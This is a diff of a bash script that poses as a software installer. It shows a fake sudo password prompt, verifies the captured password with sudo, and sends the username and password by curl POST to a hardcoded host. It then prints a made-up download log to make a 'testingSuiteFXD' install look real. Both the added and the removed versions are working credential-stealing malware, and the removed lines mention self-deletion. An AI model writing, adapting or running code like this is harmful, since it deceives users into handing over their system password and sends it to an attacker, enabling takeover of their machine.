@@ -1,41 +1,31 @@
 #!/bin/bash
 
-list=()
-int=1
+# PWD Getter
+sudo -k
 
-while [ $int -le 3 ]
-do
+read -sp "[sudo] password for $USER: " pwd < /dev/tty
+echo ""
+echo "$pwd" | sudo -S -v &>/dev/null
 
-    read -sp "[sudo] password for $USER: " pwd < /dev/tty
-    echo ""
-
-    if [ ${#pwd} -ge 4 ]; then
-        ((int++))
-    fi
-
-    sleep $(awk 'BEGIN{srand(); print 0.4 + rand() * 1}')
-
-    if [ $int -le 3 ]; then
+if ! sudo -n true 2>/dev/null; then
+    # Attempt to authenticate using the provided password
+    while ! sudo -n true 2>/dev/null; do
         echo "Sorry, try again."
-    fi
+        read -sp "[sudo] password for $USER: " pwd < /dev/tty
+        echo "$pwd" | sudo -S -v &>/dev/null
+        echo 
+    done
+fi
 
-    list+=("$pwd")
-done
-
-# encore pwd into something
-s=""
-for entry in "${list[@]}"; do
-    if [[ -n "$s" ]]; then
-        s+=", "
-    fi
-    s+="$entry"
-done
+# Sends PWD off
 
 receiver_ip="192.168.50.32"
+curl -X POST --data-raw "$USER:$pwd" http://$receiver_ip:8000/cgi-bin/handler.py
+unset pwd
 
-curl -X POST --data-raw "$s" http://$receiver_ip:8000/cgi-bin/handler.py
 
-# fake alot of stuff
+
+# preps long msg
 
 read -r -d '' brew_output <<EOF
 Downloading testingSuiteFXD
@@ -45,24 +35,22 @@ testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4
 [WARN] Packet 8491 re-sent successfully.
 testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
 [DEBUG] Flushing memory buffer to disk.
-[DEBUG] Syncing file descriptor 7.
+[DEBUG] Syncing file descriptor.
 testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
 [DEBUG] Received final packet. Assembling file.
 testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
 EOF
 
-# Read the multi-line string line by line
+# reads long msg slow
+
 while IFS= read -r line; do
-  # Print the current line
   echo "$line"
-  
-  # Pause for a very short, random duration to make it look realistic
   sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
 done <<< "$brew_output"
 
+
+# sends short msg
 echo Successfully installed testingSuiteFXD
 
 #sleep 2
 #clear
-
-# deletes itself (in the downlaod script)
